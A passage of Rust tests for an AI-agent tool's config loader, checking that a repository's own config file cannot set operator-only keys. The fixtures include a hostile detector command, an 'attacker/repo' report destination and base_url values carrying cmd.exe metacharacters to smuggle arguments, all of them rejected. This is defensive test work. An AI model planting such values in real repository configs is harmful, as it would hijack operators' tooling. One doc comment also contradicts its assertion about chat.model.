        .expect("repo");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(cfg.workflow.deploy.tier, DeployTier::Production);
    }

    #[test]
    fn repo_cannot_choose_deploy_tier_but_operator_env_can_override_the_fold() {
        use crate::commands::workflow::deploy::DeployTier;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\ntier = \"development\"\n",
        )
        .expect("repo");
        let empty = env_map(&[]);
        let error = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned())
            .expect_err("repo tier must be forbidden")
            .to_string();
        assert!(error.contains("workflow.deploy.tier"), "{error}");

        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\nminimum_tier = \"production\"\n",
        )
        .expect("repo");
        let env = env_map(&[("ZIRV_CTX_WORKFLOW_DEPLOY_TIER", "development")]);
        let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("env");
        assert_eq!(cfg.workflow.deploy.tier, DeployTier::Development);
        assert_eq!(
            cfg.workflow.deploy.minimum_tier,
            Some(DeployTier::Production),
            "the declared repo minimum remains inspectable even when operator env overrides it"
        );
    }

    #[test]
    fn workflow_adoption_defaults_to_nudge() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(
            cfg.workflow.adoption,
            crate::commands::workflow::adoption::AdoptionPolicy::Nudge
        );
    }

    #[test]
    fn workflow_adoption_env_override_parses_every_level() {
        use crate::commands::workflow::adoption::AdoptionPolicy;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");

        for (raw, expected) in [
            ("off", AdoptionPolicy::Off),
            ("advise", AdoptionPolicy::Advise),
            ("nudge", AdoptionPolicy::Nudge),
            ("enforce", AdoptionPolicy::Enforce),
        ] {
            let env = env_map(&[("ZIRV_CTX_WORKFLOW_ADOPTION", raw)]);
            let cfg =
                CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("env override");
            assert_eq!(cfg.workflow.adoption, expected, "raw value {raw}");
        }
    }

    #[test]
    fn workflow_auto_start_defaults_to_detect_parses_env_and_is_repo_forbidden() {
        use crate::commands::workflow::adoption::AutoStartPolicy;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(cfg.workflow.auto_start, AutoStartPolicy::Detect);
        for (raw, expected) in [
            ("off", AutoStartPolicy::Off),
            ("detect", AutoStartPolicy::Detect),
            ("always", AutoStartPolicy::Always),
        ] {
            let env = env_map(&[("ZIRV_CTX_WORKFLOW_AUTO_START", raw)]);
            let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("env");
            assert_eq!(cfg.workflow.auto_start, expected, "raw value {raw}");
        }
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nauto_start = \"off\"\n",
        )
        .expect("write");
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set workflow.auto_start");
        assert!(is_repo_forbidden(err.as_ref()), "{err}");
    }

    /// SECURITY: `workflow.adoption` is operator-only -- a repo checkout must
    /// not be able to loosen its own adoption pressure to `off`, nor tighten
    /// it to `enforce` to hold an operator's own agent dispatches hostage.
    #[test]
    fn a_repo_ctx_toml_cannot_set_workflow_adoption() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nadoption = \"off\"\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set workflow.adoption");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "must be a security refusal: {err}"
        );
    }

    #[test]
    fn repo_cannot_configure_maintain_commands_or_report_destination() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");

        for body in [
            "[workflow.maintain]\ntimeout_secs = 1\n[workflow.maintain.detectors.bad]\ncommand = \"echo bad\"\n",
            "[report]\nrepository = \"attacker/repo\"\n",
        ] {
            std::fs::write(repo.path().join(".zirv/ctx.toml"), body).expect("write");
            let empty = env_map(&[]);
            let error = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned())
                .expect_err("repo authority must be rejected")
                .to_string();
            assert!(
                error.contains("workflow.maintain") || error.contains("report.repository"),
                "{error}"
            );
        }
    }

    #[test]
    fn operator_can_configure_maintain_detector_and_report_destination() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow.maintain]\ntimeout_secs = 12\n[workflow.maintain.detectors.audit]\ncommand = \"printf issue\"\nmode = \"line-count\"\nthreshold = 1\n[report]\nrepository = \"owner/incidents\"\n",
        )
        .expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(cfg.workflow.maintain.timeout_secs, 12);
        let detector = cfg
            .workflow
            .maintain
            .detectors
            .get("audit")
            .expect("detector");
        assert_eq!(detector.command, "printf issue");
        assert_eq!(detector.mode, MaintainDetectorMode::LineCount);
        assert_eq!(detector.threshold, 1);
        assert_eq!(cfg.report.repository.as_deref(), Some("owner/incidents"));
    }

    #[test]
    fn report_destination_env_is_operator_final_word() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let env = env_map(&[("ZIRV_CTX_REPORT_REPOSITORY", "operator/incidents")]);
        let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("load");
        assert_eq!(cfg.report.repository.as_deref(), Some("operator/incidents"));
    }

    /// Issue #315: `search.max_output_bytes` defaults to 2048, an operator's
    /// env var wins, and a repository checkout may never set it at all (same
    /// asymmetry as every other byte cap in this file -- see `SearchConfig`'s
    /// own doc comment).
    #[test]
    fn search_max_output_bytes_defaults_and_is_operator_only() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(cfg.search.max_output_bytes, 2048);

        let env = env_map(&[("ZIRV_CTX_SEARCH_MAX_OUTPUT_BYTES", "4096")]);
        let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("load");
        assert_eq!(cfg.search.max_output_bytes, 4096);

        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[search]\nmax_output_bytes = 999999\n",
        )
        .expect("write");
        let err = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned())
            .expect_err("a repository must not be able to widen its own search output cap");
        assert!(is_repo_forbidden(err.as_ref()), "got: {err}");
    }

    /// Issue #326: every `[output]` key defaults as documented, an operator's
    /// env var wins, and a repository checkout may set none of them -- the cap
    /// for the same reason every other byte cap is operator-only, and the two
    /// compaction switches in both directions (see `OutputConfig`'s own doc
    /// comment).
    #[test]
    fn output_keys_default_and_are_operator_only() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert!(cfg.output.compact);
        assert_eq!(cfg.output.compact_min_bytes, 4096);
        assert_eq!(cfg.output.compact_generic_min_bytes, 16384);
        assert!(cfg.output.verbatim.is_empty());
        assert_eq!(cfg.output.max_summary_bytes, 4096);
        assert_eq!(cfg.output.diff_max_bytes, 65536);
        assert!(cfg.output.compact_search);
        assert!(cfg.output.filter_defaults);

        let env = env_map(&[
            ("ZIRV_CTX_OUTPUT_COMPACT", "false"),
            ("ZIRV_CTX_OUTPUT_COMPACT_MIN_BYTES", "1024"),
            ("ZIRV_CTX_OUTPUT_COMPACT_GENERIC_MIN_BYTES", "65536"),
            ("ZIRV_CTX_OUTPUT_VERBATIM", "mydump,other-tool"),
            ("ZIRV_CTX_OUTPUT_MAX_SUMMARY_BYTES", "2048"),
            ("ZIRV_CTX_OUTPUT_DIFF_MAX_BYTES", "8192"),
            ("ZIRV_CTX_OUTPUT_COMPACT_SEARCH", "false"),
            ("ZIRV_CTX_OUTPUT_FILTER_DEFAULTS", "false"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("load");
        assert!(!cfg.output.compact);
        assert_eq!(cfg.output.compact_min_bytes, 1024);
        assert_eq!(cfg.output.compact_generic_min_bytes, 65536);
        assert_eq!(cfg.output.verbatim, vec!["mydump", "other-tool"]);
        assert_eq!(cfg.output.max_summary_bytes, 2048);
        assert_eq!(cfg.output.diff_max_bytes, 8192);
        assert!(!cfg.output.compact_search);
        assert!(!cfg.output.filter_defaults);

        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        for line in [
            "max_summary_bytes = 999999",
            "compact = false",
            "compact_min_bytes = 999999",
            "compact_generic_min_bytes = 999999",
            "verbatim = [\"cargo\"]",
            "compact_search = false",
            "filter_defaults = false",
        ] {
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[output]\n{line}\n"),
            )
            .expect("write");
            let err = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned())
                .expect_err("a repository must not be able to set `{line}`");
            assert!(is_repo_forbidden(err.as_ref()), "got: {err}");
        }
    }

    /// Issue #417: `output.filter` is `REPO_FORBIDDEN` as a whole table --
    /// there is no `ZIRV_CTX_*` escape hatch for a structured rule list, so
    /// the operator's own `~/.zirv/ctx.toml` is the only place it can be
    /// declared.
    #[test]
    fn output_filter_is_repo_forbidden_but_operator_settable() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[[output.filter]]\nname = \"gradle\"\nmatch_command = \"^gradle\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("the operator's own ctx.toml may declare output.filter rules");
        let bundled = super::super::output_filters::bundled_output_filter_rules();
        assert_eq!(cfg.output.filter.len(), 1 + bundled.len());
        assert_eq!(cfg.output.filter[0].name, "gradle");
        assert_eq!(
            cfg.output.filter[1..]
                .iter()
                .map(|rule| rule.name.as_str())
                .collect::<Vec<_>>(),
            bundled
                .iter()
                .map(|rule| rule.name.as_str())
                .collect::<Vec<_>>(),
            "the operator rule must precede every bundled rule, in the bundled rules' own order"
        );

        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[[output.filter]]\nname = \"evil\"\nmatch_command = \"^anything\"\n",
        )
        .expect("write");
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to declare output.filter rules");
        assert!(is_repo_forbidden(err.as_ref()), "got: {err}");
    }

    /// Issue #417: an unanchored `match_command` -- one whose top-level
    /// alternative does not start with `^` -- is refused at load time, by
    /// name, rather than silently matching more commands than the operator
    /// meant (`gradle` would also match `my-not-gradle-thing`).
    #[test]
    fn unanchored_match_command_is_a_named_config_error() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[[output.filter]]\nname = \"bad-rule\"\nmatch_command = \"gradle\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("an unanchored match_command must be refused");
        assert!(
            err.to_string().contains("bad-rule"),
            "the error must name the rule: {err}"
        );
        assert!(
            err.to_string().contains("fully anchored"),
            "the error must explain why: {err}"
        );
    }

    /// Issue #417: an invalid regex anywhere in a rule is refused by name,
    /// not merely the anchoring check.
    #[test]
    fn an_invalid_regex_in_a_filter_rule_is_a_named_config_error() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[[output.filter]]\nname = \"broken\"\nmatch_command = \"^ok\"\nstrip_lines = [\"(unclosed\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("an unparseable regex must be refused");
        assert!(
            err.to_string().contains("broken"),
            "the error must name the rule: {err}"
        );
    }

    /// Issue #417: two rules sharing a `name` are refused -- every load
    /// error names a rule by its `name`, so two of them with the same name
    /// would leave an operator unable to tell which one a later error means.
    #[test]
    fn duplicate_filter_rule_names_are_a_config_error() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[[output.filter]]\nname = \"dup\"\nmatch_command = \"^a\"\n\n\
             [[output.filter]]\nname = \"dup\"\nmatch_command = \"^b\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("duplicate rule names must be refused");
        assert!(
            err.to_string().contains("dup"),
            "the error must name the duplicate: {err}"
        );
    }

    /// Review finding: an `[endpoint.*]` `base_url` that carries a cmd.exe
    /// reparse metacharacter, whitespace, or a `'` (which forces `toml_
    /// quoted_string`'s escaped-basic-string fallback, itself introducing a
    /// raw `"`) must be refused at load time -- see `validate_endpoint_
    /// target`'s own doc comment for the full threat. A plain URL with none
    /// of those characters still passes.
    #[test]
    fn endpoint_base_url_rejects_argv_unsafe_characters() {
        let bad_cases: &[&str] = &[
            "[endpoint.codex]\nvendor = \"deepseek\"\nbase_url = \"https://api.example.com/v1?a=b&c=d\"\ncredential_env = \"X\"\n",
            "[endpoint.codex]\nvendor = \"deepseek\"\nbase_url = \"https://x.y/it's\"\ncredential_env = \"X\"\n",
        ];
        for home_toml in bad_cases {
            let home = tempfile::tempdir().expect("home");
            std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
            std::fs::write(home.path().join(".zirv/ctx.toml"), home_toml).expect("write");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

            let repo = tempfile::tempdir().expect("repo");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err(&format!("must be rejected: {home_toml}"));
            assert!(
                err.to_string().contains("endpoint.codex"),
                "the error must name the table: {err}"
            );
            assert!(
                err.to_string().contains("base_url must not contain"),
                "the error must name the character: {err}"
            );
        }

        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[endpoint.codex]\nvendor = \"deepseek\"\nbase_url = \"https://api.deepseek.com\"\ncredential_env = \"DEEPSEEK_API_KEY\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let empty: HashMap<String, String> = HashMap::new();
        CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("a plain https URL with no unsafe characters must be accepted");
    }

    /// Issue #326 review finding 7: a `max_summary_bytes` below
    /// `MIN_MAX_SUMMARY_BYTES` cannot hold a header, a failure line and the
    /// retrieval line at once, so honoring it literally would mean emitting
    /// summaries with the failures cut off. Refused by name, not clamped.
    #[test]
    fn a_summary_cap_below_the_floor_is_a_named_config_error() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");

        for value in ["0", "64", "511"] {
            let env = env_map(&[("ZIRV_CTX_OUTPUT_MAX_SUMMARY_BYTES", value)]);
            let err = CtxConfig::load(repo.path(), &|key| env.get(key).cloned())
                .expect_err("a cap below the floor must be refused");
            assert!(
                err.to_string().contains("output.max_summary_bytes"),
                "the error must name the key: {err}"
            );
        }
        let env = env_map(&[(
            "ZIRV_CTX_OUTPUT_MAX_SUMMARY_BYTES",
            &MIN_MAX_SUMMARY_BYTES.to_string(),
        )]);
        let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned())
            .expect("the floor itself is accepted");
        assert_eq!(cfg.output.max_summary_bytes, MIN_MAX_SUMMARY_BYTES);
    }

    /// Every configurable key in `CtxConfig`'s tree, as (table path, key)
    /// pairs. `table path` is dot-joined to match how a nested table's
    /// header appears in the sample-config file (`"pace.use_credits"`); the
    /// empty string is the top-level (pre-`[table]`) scope.
    ///
    /// Hand-maintained against config.rs's struct definitions rather than
    /// derived from `ENV_MAP`: `ENV_MAP` only covers keys that have an
    /// environment override and is missing several real config keys (every
    /// `score` weight/threshold, `handoff.tail_items`,
    /// `optimize.max_surface_bytes` and its `recommend_*` siblings), so it
    /// is not a complete key list on its own.
    const ALL_CONFIG_KEYS: &[(&str, &str)] = &[
        ("fallback", "reactive_force_after_secs"),
        ("fallback.health", "enabled"),
        ("fallback.health", "open_after_failures"),
        ("fallback.health", "window_secs"),
        ("fallback.health", "cooldown_secs"),
        ("fallback.health", "degrade_error_rate_pct"),
        ("fallback.health", "degrade_min_samples"),
        ("fallback.health", "degrade_ttft_ms"),
        ("", "agent"),
        ("", "agent_bin"),
        ("chat", "model"),
        ("review", "claude"),
        ("review", "codex"),
        ("worker", "claude"),
        ("worker", "codex"),
        ("worker", "default_depth"),
        ("worker", "default_read_only"),
        ("worker", "max_depth"),
        ("worker", "deny_network"),
        ("worktree", "idle_pool_max"),
        ("worktree", "idle_ttl_secs"),
        ("objective", "gates"),
        ("objective", "max_cycles_without_progress"),
        ("objective", "judge"),
        ("screen", "repetition_min_fragment"),
        ("screen", "repetition_window"),
        ("screen", "repetition_min_repeats"),
        ("screen", "repetition_dominance_pct"),
        ("handover.claude", "cheap"),
        ("handover.claude", "standard"),
        ("handover.claude", "deep"),
        ("handover.codex", "cheap"),
        ("handover.codex", "standard"),
        ("handover.codex", "deep"),
        ("model_tiers.claude", "fast"),
        ("model_tiers.claude", "standard"),
        ("model_tiers.claude", "deep"),
        ("model_tiers.codex", "fast"),
        ("model_tiers.codex", "standard"),
        ("model_tiers.codex", "deep"),
        ("score", "window"),
        ("score", "min_turns"),
        ("score", "token_floor"),
        ("score", "token_ceiling"),
        ("score", "token_floor_ratio"),
        ("score", "token_ceiling_ratio"),
        ("score", "model_context_tokens"),
        ("score", "weight_tool_failure"),
        ("score", "weight_repetition"),
        ("score", "weight_marker"),
        ("score", "same_error_weight"),
        ("score", "repetition_threshold"),
        ("score", "same_error_threshold"),
        ("score", "advise_at"),
        ("score", "compact_at"),
        ("score", "restart_at"),
        ("score", "marker"),
        ("wrap", "debounce_ms"),
        ("wrap", "inject_timeout_ms"),
        ("supervise", "max_restarts"),
        ("supervise", "poll_ms"),
        ("supervise", "interval_secs"),
        ("supervise", "max_cycle_secs"),
        ("supervise", "max_failures"),
        ("supervise", "backoff_base_secs"),
        ("supervise", "on_failure"),
        ("supervise", "max_nudges"),
        ("supervise", "max_heavy_operations"),
        ("supervise", "max_heavy_workers"),
        ("supervise", "max_writers"),
        ("supervise", "idle_no_tool_secs"),
        ("supervise", "in_tool_secs"),
        ("supervise", "stall_grace_secs"),
        ("supervise", "compact_stall_secs"),
        ("supervise", "compact_timeout_ms"),
        ("supervise", "chain_max_restarts"),
        ("supervise", "chain_max_gap_secs"),
        ("supervise", "orchestrator_writes"),
        ("supervise", "loop_backoff_ceiling_secs"),
        ("handoff", "model"),
        ("handoff", "tail_items"),
        ("handoff", "timeout_secs"),
        ("pace", "enabled"),
        ("pace", "max_percent"),
        ("pace", "collector_max_age_secs"),
        ("pace", "estimator"),
        ("pace", "five_hour_budget_tokens"),
        ("pace", "seven_day_budget_tokens"),
        ("pace", "count_cache_reads"),
        ("pace", "jitter_secs"),
        ("pace", "fallback_delay_secs"),
        ("pace", "wait_slack_secs"),
        ("pace", "max_wait_secs"),
        ("pace", "soft_percent"),
        ("pace", "poll_enabled"),
        ("pace", "poll_min_interval_secs"),
        ("pace", "blind_delay_secs"),
        ("pace", "spawn_soft_pct"),
        ("pace", "spawn_hard_pct"),
        ("pace", "run_budget_tokens"),
        ("pace.use_credits", "claude"),
        ("pace.use_credits", "codex"),
        ("price", "stale_after_days"),
        ("price", "table_path"),
        ("models", "discovery"),
        ("models", "price_fetch"),
        ("models", "pin"),
        ("models", "avoid"),
        ("models", "auto_avoid"),
        ("compact_advisory", "min_reclaim_tokens"),
        ("compact_advisory", "window_fraction"),
        ("optimize", "enabled"),
        ("optimize", "sessions_sampled"),
        ("optimize", "max_surface_bytes"),
        ("optimize", "model"),
        ("optimize", "recommend_tool_failure_rate"),
        ("optimize", "recommend_corrections"),
        ("optimize", "recommend_cooldown_secs"),
        ("prompt", "enabled"),
        ("prompt", "repo_layer"),
        ("prompt", "max_repo_bytes"),
        ("prompt", "harnesses"),
        ("prompt", "skill_index"),
        ("prompt", "intake_discipline"),
        ("prompt", "codex_orchestrator"),
        ("prompt", "verbosity"),
        ("context", "max_common_bytes"),
        ("context", "max_harness_bytes"),
        ("context", "max_harness_roster_bytes"),
        ("context", "dedupe_native"),
        ("context", "lint_max_pairs"),
        ("context", "instructions_max_bytes"),
        ("mail", "enabled"),
        ("mail", "max_message_bytes"),
        ("mail", "max_delivered_bytes"),
        ("mail", "keep"),
        ("mail", "mid_turn"),
        ("supervisor", "enabled"),
        ("supervisor", "harness"),
        ("supervisor", "model"),
        ("supervisor", "max_calls"),
        ("supervisor", "max_advice_bytes"),
        ("memory", "enabled"),
        ("memory", "harvest"),
        ("memory", "max_entries"),
        ("memory", "max_entry_bytes"),
        ("memory", "max_injected_bytes"),
        ("memory", "shared_enabled"),
        ("memory", "core_max_bytes"),
        ("memory", "retrieval_max_bytes"),
        ("memory", "retrieval_max_entries"),
        ("memory", "harvest_max_entries"),
        ("memory", "harvest_max_bytes"),
        ("memory", "session_enabled"),
        ("memory", "journal_max_entries"),
        ("setup", "backup_retention_runs"),
        ("setup", "memory_harvest_offered"),
        ("setup", "statusline_wrap_offered"),
        ("chrome", "banner"),
        ("chrome", "bar"),
        ("chrome", "events"),
        ("dash", "enabled"),
        ("dash", "sidebar_cols"),
        ("dash", "roster_max_age_secs"),
        ("dash", "max_panes"),
        ("dash", "mouse"),
        ("dash", "idle_quiet_ms"),
        ("dash", "workdir_roots"),
        ("dash", "motion"),
        ("workflow", "repo_checks_enabled"),
        ("workflow", "repo_skills_enabled"),
        ("workflow", "repo_agents_enabled"),
        ("workflow", "repo_workflows_enabled"),
        ("workflow.deploy", "tier"),
        ("workflow.deploy", "minimum_tier"),
        ("workflow", "adoption"),
        ("workflow", "auto_start"),
        ("workflow.maintain", "timeout_secs"),
        ("report", "repository"),
        ("search", "max_output_bytes"),
        ("output", "compact"),
        ("output", "compact_min_bytes"),
        ("output", "compact_generic_min_bytes"),
        ("output", "verbatim"),
        ("output", "max_summary_bytes"),
        ("output", "diff_max_bytes"),
        ("output", "compact_search"),
        ("output", "filter_defaults"),
        ("workflow", "telemetry_enabled"),
        ("workflow", "telemetry_max_events"),
        ("workflow", "telemetry_retention_days"),
        ("workflow", "check_env_passthrough"),
        ("workflow", "review_worker_budget_tokens"),
        ("workflow", "review_worker_max_tool_calls"),
        ("workflow", "auto_spawn_on_gate"),
        ("workflow", "allow_empty_verify"),
        ("workflow", "builtin_checks_exclude"),
        ("workflow", "max_context_bytes"),
        ("policy", "repo_fs_write"),
        ("policy", "outside_repo_fs_write"),
        ("policy", "shell_exec"),
        ("policy", "network"),
        ("policy", "network_allowlist"),
        ("policy", "approval"),
        ("policy", "git_push_destructive"),
        ("policy", "tool_access"),
        ("safety", "deny"),
        ("safety", "ask"),
        ("safety", "allow"),
        ("safety", "escape_allow"),
        ("safety", "default"),
        ("safety", "interactive_default"),
        ("safety", "sql"),
        ("safety", "denial_breaker_threshold"),
        ("safety", "identical_command_warn_after"),
        ("safety", "identical_command_refuse_after"),
        ("task", "max_parent_outcome_bytes"),
    ];

    /// The lines belonging to table `path` in a sample-config file like
    /// `.zirv/ctx.toml`: from the line naming `[path]` (commented or not,
    /// e.g. `# [pace.use_credits]`) up to (but excluding) the next such
    /// header line, or from the top of the file up to the first header when
    /// `path` is empty. Table-scoped so a key name that repeats across
    /// tables (`enabled`, `model`) can't produce a false positive from an
    /// unrelated section.
    fn table_section(text: &str, path: &str) -> String {
        let lines: Vec<&str> = text.lines().collect();
        let is_header = |line: &str| {
            line.trim_start()
                .trim_start_matches('#')
                .trim_start()
                .starts_with('[')
        };
        let wanted = format!("[{path}]");
        let start = if path.is_empty() {
            0
        } else {
            let idx = lines
                .iter()
                .position(|l| {
                    l.trim_start()
                        .trim_start_matches('#')
                        .trim_start()
                        .starts_with(&wanted)
                })
                .unwrap_or_else(|| panic!("no [{path}] header found in the file"));
            idx + 1
        };
        let end = lines[start..]
            .iter()
            .position(|l| is_header(l))
            .map_or(lines.len(), |i| start + i);
        lines[start..end].join("\n")
    }

    /// Whether `key` appears as its own assignment (`key = ...`) somewhere in
    /// `section`, active or commented out. Only the key name is checked, not
    /// the value, so this must not fail when someone edits a value.
    fn section_has_key(section: &str, key: &str) -> bool {
        section.lines().any(|line| {
            line.trim_start()
                .trim_start_matches('#')
                .trim_start()
                .starts_with(&format!("{key} ="))
        })
    }

    /// The checked-in `.zirv/ctx.toml` is a sample-config reference: every
    /// key is shown, commented out, at its built-in default, so it doubles
    /// as documentation of what `CtxConfig` can be tuned to do without ever
    /// actually setting anything (see the file's own header for why an
    /// *active* default-valued key would be a real bug: the repo layer
    /// merges on top of the operator's own global `~/.zirv/ctx.toml` in
    /// `CtxConfig::load`, so an active key here would silently clobber a
    /// real customization of the same key).
    ///
    /// Two things are pinned:
    /// (a) the file still parses cleanly through the real repo-layer path,
    ///     and `chat.model = "fable"` -- a real, previously-committed
    ///     operator decision (see the file's own comment) and the one key
    ///     that is deliberately NOT `REPO_FORBIDDEN`, see `ChatConfig`'s doc
    ///     comment -- is the ONLY active, non-default value it produces;
    /// (b) every key in `ALL_CONFIG_KEYS` still appears in the file text,
    ///     active or commented, so the reference stays exhaustive as
    ///     config.rs grows: this must fail only when a key is missing from
    ///     the file entirely, never when someone edits a value.
    #[test]
    fn the_repo_ctx_toml_parses_and_stays_exhaustive() {
        let repo = Path::new(env!("CARGO_MANIFEST_DIR"));
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo, &|k| empty.get(k).cloned())
            .expect("the repo's own .zirv/ctx.toml must parse cleanly");

        let expected = CtxConfig {
            agents: cfg.agents.clone(),
            chat: ChatConfig {
                model: Some("claude-opus-5-5".to_string()),
                claude_permission_mode: None,
            },
            output: OutputConfig {
                filter: super::super::output_filters::bundled_output_filter_rules(),
                ..OutputConfig::default()
            },
            ..CtxConfig::default()
        };
        assert_eq!(
            cfg, expected,
            "chat.model must be the only active, non-default key in .zirv/ctx.toml, and \
             output.filter must be exactly the bundled defaults (filter_defaults defaults true)"
        );

        let path = repo
            .join(crate::utils::SCRIPT_DIR_NAME)
            .join(CTX_CONFIG_FILE);
        let text = std::fs::read_to_string(&path).expect("read .zirv/ctx.toml");
        for (table, key) in ALL_CONFIG_KEYS {
            let section = table_section(&text, table);
            assert!(
                section_has_key(&section, key),
                "{}: key `{key}` missing from table `[{table}]` (active or commented)",
                path.display()
            );
        }
    }

    /// Companion to the test above: `.zirv/.settings.toml` parses cleanly
    /// through the real settings loader. Every line in it is commented out
    /// (sample-config style, same as ctx.toml), so both known agents stay
    /// enabled at their default.
    #[test]
